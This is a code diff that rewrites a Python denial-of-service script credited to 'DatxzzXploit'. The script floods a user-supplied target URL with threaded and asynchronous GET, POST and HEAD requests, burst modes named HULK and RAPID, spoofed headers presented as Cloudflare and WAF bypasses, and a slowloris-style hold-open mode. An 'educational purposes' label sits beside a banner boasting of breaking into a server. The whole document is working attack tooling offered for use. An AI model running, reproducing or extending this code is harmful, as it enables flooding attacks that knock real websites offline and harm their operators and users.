@@ -1,164 +1,139 @@
 import requests
 import threading
-import time
 import random
-import string
+import time
+import argparse
+from colorama import Fore, Style, init
 import socket
-import urllib3
-from termcolor import colored
+import asyncio
 
-# Suppress only the single InsecureRequestWarning from urllib3 needed
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# Initialize colorama
+init(autoreset=True)
 
-# Banner Display with color and fixed formatting
-def memekv1():
-    print(colored("""
-    [#] Attack By : @DatxzzNetworkZ [#]
- __ _  __ __    _  _     __ ________    __
-|_ |_)|_ |_    |_)|_||  |_ (_  |  | |\||_ 
-|  | \|__|__   |  | ||__|____) | _|_| ||__
-              Free Palestine
-       """, 'red'))
-    print("--------------------------------------------------")
-    print(" - DDoS Attack Tool - ")
-    print("--------------------------------------------------")
-    print("Version: 1.1")
-    print("Author: DatxzzXploit")
-    print("--------------------------------------------------")
-    print("Disclaimer: The official script I created is DatxzzXploit. Use this script wisely..")
-    print("--------------------------------------------------")
+# Example methods
+methods = ['GET', 'POST', 'HEAD', 'TLS', 'BYPASS', 'HULK', 'DEF', 'RAPID', 'CLOUDFLARE_BYPASS', 'BYPASS_WAF', 'HIGH_CAPACITY']
 
-# Function to get website info (ISP, Region, IP)
-def website_info(url):
-    try:
-        # Get IP address
-        ip_address = socket.gethostbyname(url.replace("http://", "").replace("https://", ""))
-        print(f"IP Address: {ip_address}")
-        
-        # Get ISP and Region info
-        response = requests.get(f"http://ipinfo.io/{ip_address}/json")
-        info = response.json()
-        print(f"ISP: {info.get('org', 'N/A')}")
-        print(f"Region: {info.get('region', 'N/A')}")
-        print(f"URL: {url}")
-    except Exception as e:
-        print(f"Error retrieving website info: {e}")
+# List of User-Agent strings to randomize requests
+user_agents = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/50.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/16.16299',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15'
+]
 
-# Function to load user-agents from ua.txt
-def load_user_agents():
-    try:
-        with open("ua.txt", "r") as file:
-            user_agents = [line.strip() for line in file.readlines()]
-        return user_agents
-    except Exception as e:
-        print(f"Error loading user agents: {e}")
-        return []
+def banner():
+    print(Fore.RED + """
+  _ _   __ ____ __      ___   ___ 
+ | | | /  \__ / \ \    / /_\ | __|
+ |_  _| () |_ \  \ \/\/ / _ \| _| 
+   |_| \__/___/   \_/\_/_/ \_\_| 
+                      ــــــــﮩ٨ـﮩﮩ٨ـﮩ٨ـﮩﮩ٨ــــ
+   
+    """ + Style.RESET_ALL)
+    print(Fore.YELLOW + "Created by: DatxzzXploit")
+    print(Fore.YELLOW + "Version: 3.5")
+    print(Fore.RED + """
+Disclaimer: This script was officially created by DatxzzXploit. I don't know whether this script works or not because I attacked the website and broke into the server. Greetings from Ethical Hacking.
+""" + Style.RESET_ALL)
 
-# Function to generate a random user agent from the loaded list
-def random_user_agent(user_agents):
-    return random.choice(user_agents) if user_agents else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
-
-# Function to generate random data for POST request
-def random_data():
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))  # random data for POST
-
-# Function to simulate request with GET/POST methods, including WAF evasion headers, TLS bypass
-def send_request(url, method="GET", user_agents=None):
+def send_request(url, method):
     headers = {
-        "User-Agent": random_user_agent(user_agents),
-        "Accept-Encoding": "gzip, deflate, br",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Connection": "keep-alive",
-        "Cache-Control": "max-age=0",
-        "Upgrade-Insecure-Requests": "1",
-        "Origin": url,
-        "Referer": url,
-        "Dnt": "1",
-        "TE": "Trailers"
+        'User-Agent': random.choice(user_agents),
+        'Connection': 'keep-alive',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.9'
     }
 
     try:
-        # Send GET request (TLS Bypass)
-        if method == "GET":
-            requests.get(url, headers=headers, timeout=5, verify=False)  
-        # Send POST request (TLS Bypass)
-        elif method == "POST":
-            data = random_data()
-            requests.post(url, headers=headers, data=data, timeout=5, verify=False)  
-        # Send HEAD request (TLS Bypass)
-        elif method == "HEAD":
-            requests.head(url, headers=headers, timeout=5, verify=False)  
-        # Simulating HULK-like traffic (TLS Bypass)
-        elif method == "HULK":
-            headers["User-Agent"] = random.choice([
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36"
-            ])  
-            requests.get(url, headers=headers, timeout=5, verify=False)  
-        elif method == "RAPID":
-            # Randomly choose a method for rapid attack
-            rapid_method = random.choice(["GET", "POST", "HEAD", "HULK"])
-            send_request(url, rapid_method, user_agents)  # Call recursively for rapid method
-        elif method == "MIX":
-            # Mixing methods for attack variety
-            mixed_method = random.choice(["GET", "POST", "HEAD", "HULK"])
-            send_request(url, mixed_method, user_agents)  # Recursively use the mixed method
-    except requests.exceptions.RequestException as e:
-        print(f"Request error: {e}")
+        if method == 'GET':
+            requests.get(url, headers=headers)
+        elif method == 'POST':
+            requests.post(url, data={}, headers=headers)
+        elif method == 'HEAD':
+            requests.head(url, headers=headers)
+        elif method == 'TLS':
+            requests.get(url, headers=headers, verify=False)
+        elif method == 'HULK':
+            for _ in range(100):
+                requests.get(url, headers=headers)
+        elif method == 'DEF':
+            requests.get(url, headers=headers)
+        elif method == 'RAPID':
+            # RAPID method: Simulate high-frequency requests with minimal delay
+            for _ in range(500):  # More aggressive, higher number of requests
+                requests.get(url, headers=headers)
+        elif method == 'CLOUDFLARE_BYPASS':
+            # Example implementation to bypass Cloudflare
+            session = requests.Session()
+            session.headers.update(headers)
+            response = session.get(url)
+            if "cf_challenge" in response.text:
+                print(Fore.RED + "Cloudflare challenge detected, attempting bypass..." + Style.RESET_ALL)
+                # Attempting to solve Cloudflare challenge
+                # This is a simplified example and might need custom handling based on the actual challenge
+                challenge_url = response.url
+                session.get(challenge_url)
+                # Send the normal GET request after bypass
+                requests.get(url, headers=headers)
+            else:
+                print(Fore.GREEN + "Cloudflare bypass successful!" + Style.RESET_ALL)
+        elif method == 'BYPASS_WAF':
+            # WAF bypass method: Use random headers and parameters to bypass WAF
+            waf_headers = {
+                'User-Agent': random.choice(user_agents),
+                'X-Forwarded-For': f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
+                'Referer': url,
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate'
+            }
+            requests.get(url, headers=waf_headers)
+        elif method == 'HIGH_CAPACITY':
+            # High capacity attack: Simulate slow loris attack
+            session = requests.Session()
+            session.headers.update(headers)
+            response = session.get(url, stream=True)
+            for chunk in response.iter_content(chunk_size=8192):
+                time.sleep(0.1)  # Slow down the request to keep the connection open
 
-# Function to handle thread RPS (requests per second) over a specified time
-def thread_rps(url, threads, method="GET", user_agents=None):
-    for i in range(threads):
-        t = threading.Thread(target=send_request, args=(url, method, user_agents))
-        t.start()
-        time.sleep(0.1)  # Delay to avoid overloading the server too quickly
+        print(Fore.GREEN + f"Request sent using {method} method" + Style.RESET_ALL)
+    except Exception as e:
+        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
 
-# Function for powerful attack (100x power increase)
-def powerful_attack(url, threads, method="GET", user_agents=None):
-    print("Starting powerful attack (100x power)...")
-    new_threads = threads * 100  # Increase threads by 100 times
-    thread_rps(url, new_threads, method, user_agents)
+async def async_attack(url, method):
+    while True:
+        send_request(url, method)
+        await asyncio.sleep(0.1)  # Small delay to reduce CPU/GPU usage
 
-# Function to simulate starting idle time (attacker waits for a while)
-def start_idle():
-    print("Starting idle mode... Waiting before attacking.")
-    time.sleep(5)  # Controlled wait time before attack
-    print("Idle time finished. Starting attack...")
-
-# Main function to control the flow
-def start_attack(url, threads, attack_type, user_agents):
-    start_idle()  # Idle mode
-    while True:  # Infinite loop until interrupted
-        if attack_type == "n" or attack_type == "y":
-            for _ in range(threads):
-                # Randomly choose the attack method (GET, POST, HEAD, HULK, RAPID, or MIX)
-                method = random.choice(["GET", "POST", "HEAD", "HULK", "RAPID", "MIX"])  
-                print(f"Using method: {method}")
-                if attack_type == "n":
-                    print("Starting normal attack...")
-                    thread_rps(url, threads, method, user_agents)
-                elif attack_type == "y":
-                    powerful_attack(url, threads, method, user_agents)
-        else:
-            print("Invalid attack type. Exiting.")
-            break
-        time.sleep(0.1) # Adding slight delay between attack iterations to avoid overwhelming the CPU
-
-def main():
-    memekv1()
-
-    url = input("Enter target URL : ")
-    threads = int(input("Enter number of threads (e.g., 10): "))
-    attack_type = input("Choose attack type (n for normal / y for powerful): ")
-
-    website_info(url)
-
-    user_agents = load_user_agents()
-
-    if attack_type == "n" or attack_type == "y":
-        start_attack(url, threads, attack_type, user_agents)
-    else:
-        print("Invalid attack type. Exiting.")
+def check_port(url, port):
+    try:
+        socket.create_connection((url, port), timeout=5)
+        return True
+    except (socket.timeout, socket.error):
+        return False
 
 if __name__ == "__main__":
-    main()
+    banner()
+    parser = argparse.ArgumentParser(description="DDoS Attack Script for Educational Purposes")
+    parser.add_argument("url", help="Target URL")
+    parser.add_argument("-m", "--method", choices=methods, default=random.choice(methods), help="HTTP method to use for the attack")
+    parser.add_argument("-t", "--threads", type=int, default=1000, help="Number of threads to use")
+
+    args = parser.parse_args()
+
+    url = args.url
+    method = args.method
+    threads = args.threads
+
+    print(Fore.CYAN + f"Attacking {url} using {method} method with {threads} threads" + Style.RESET_ALL)
+
+    if method in ['HIGH_CAPACITY', 'CLOUDFLARE_BYPASS']:
+        # Use asyncio for these methods to reduce CPU/GPU usage
+        loop = asyncio.get_event_loop()
+        tasks = [asyncio.ensure_future(async_attack(url, method)) for _ in range(threads)]
+        loop.run_until_complete(asyncio.wait(tasks))
+    else:
+        for i in range(threads):
+            t = threading.Thread(target=send_request, args=(url, method))
+            t.start()
+            time.sleep(0.1)  # Small delay to avoid overwhelming the system immediately
